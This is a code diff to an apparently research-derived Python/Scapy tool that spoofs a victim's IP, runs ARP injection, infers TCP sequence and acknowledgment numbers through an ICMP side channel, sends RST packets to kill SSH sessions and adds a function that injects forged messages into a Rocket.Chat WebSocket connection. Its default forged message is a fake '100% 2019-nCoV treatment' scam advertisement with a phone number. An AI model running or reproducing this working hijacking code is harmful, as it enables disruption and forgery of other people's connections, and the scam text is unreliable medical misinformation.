@@ -8,6 +8,8 @@ from scapy.all import *
 from scapy.layers.inet import *
 from scapy.layers.l2 import *
 
+from  IPID_HCSC.webscoket_gen import get_websocket_messege
+
 TCP_INVALID_RATELIMIT = 0.5
 
 class Ack_Finder:
@@ -100,19 +102,20 @@ class Ack_Finder:
 
     def check_new_point_seq(self, list_p):
         C = len(list_p)
+        icmp_seq = random.randint(0, (1 << 16) - 1)
 
         send_list = [IP(src=self.victim_ip, dst=self.server_ip) /
                      TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win,
                          ack=self.ack_check_start, flags='A'),
-                     IP(src=self.forge_ip, dst=self.server_ip) / ICMP()]
+                     IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
         for sq in list_p:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                              TCP(sport=self.client_port, dport=self.server_port, seq=sq,
                                  ack=self.ack_check_start, flags='A') / 'a')
-            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP())
+            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
         while True:
-            pkts = sniff(filter="icmp and dst " + self.forge_ip,
+            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                          iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
             if len(pkts) != 1 + C:
@@ -139,7 +142,7 @@ class Ack_Finder:
 
         ans = -1
         while rb >= lb:
-            mid = (lb + rb) / 2
+            mid = int((lb + rb) / 2)
             in_bound = True
             n = 0
             for i in range(0, D):
@@ -161,15 +164,15 @@ class Ack_Finder:
 
     def check_new_point_ack(self, list_p):
         C = len(list_p)
-
-        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP()]
+        icmp_seq = random.randint(0, (1 << 16) - 1)
+        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
         for ac in list_p:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                              TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
-            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP())
+            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
         while True:
-            pkts = sniff(filter="icmp and dst " + self.forge_ip,
+            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                          iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
             if len(pkts) != 1 + C:
@@ -214,7 +217,7 @@ class Ack_Finder:
         L = 50
 
         while (rb - lb) >= L:
-            step = (rb - lb) / L
+            step = int((rb - lb) / L)
             ls = [lb]
             for i in range(0, L - 1):
                 ls.append(ls[-1] + step)
@@ -274,6 +277,22 @@ class Ack_Finder:
         self.find_seq()
         e_t = time.time()
         print('Cost Time: ' + str(e_t - s_t) + ' (s)')
+        return e_t - s_t
+
+    def run_attack_rocket_chat(self):
+        ts = threading.Thread(target=self.arp_inject)
+        ts.start()
+
+        tr = threading.Thread(target=self.tcp_fragment)
+        tr.start()
+        s_t = time.time()
+        print('------ ACK/SEQ Find ------')
+        self.find_ack_challenge_win()
+        self.find_left_bound_ack()
+        self.find_seq()
+        e_t = time.time()
+        print('Cost Time: ' + str(e_t - s_t) + ' (s)')
+        time.sleep(self.__sleep_time)
         return e_t - s_t
 
 
@@ -340,3 +359,27 @@ def attack_action_ssh(client_ip, server_ip, client_port, server_port, seq, ifnam
     send(IP(src=client_ip, dst=server_ip, tos=0xc0) /
          TCP(sport=client_port, dport=server_port, seq=seq + 1, flags='R'),
          iface=ifname, verbose=False)
+
+
+def attack_action_rocketchat(client_ip, server_ip, client_port, server_port, seq, ack,
+                             room_id, forged_message='', ifname='ens33'):
+    if len(forged_message) == 0:
+        forged_message = '------ 100% 2019-nCoV Treatment!!! ------\r\n' + \
+                         '- 15 minutes to Diagnosis 2019 new Coronavirus,\r\n' + \
+                         '  the minimum cost is only 325$!!!!!!\r\n' + \
+                         '- 3 days to cure new coronavirus with 100%\r\n' + \
+                         '  success rate. The minimum cost is only 4096$!!!\r\n\r\n' + \
+                         'We have Advanced Medical Equipments and Specific \r\n' + \
+                         'Medicine which is hard to buy on public markets.\r\n' + \
+                         'Our Treatment will give you life-long immunity.\r\n\r\n' + \
+                         'If you need our help or more details please contact\r\n' + \
+                         'Doctor Feng at 16723452345.\r\n'
+
+    load = get_websocket_messege(forged_message=forged_message, room_id=room_id)
+
+    send_list = []
+    send_list.append(IP(src=client_ip, dst=server_ip) /
+                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack, flags='PA') /
+                     load)
+
+    send(send_list, iface=ifname, verbose=False)
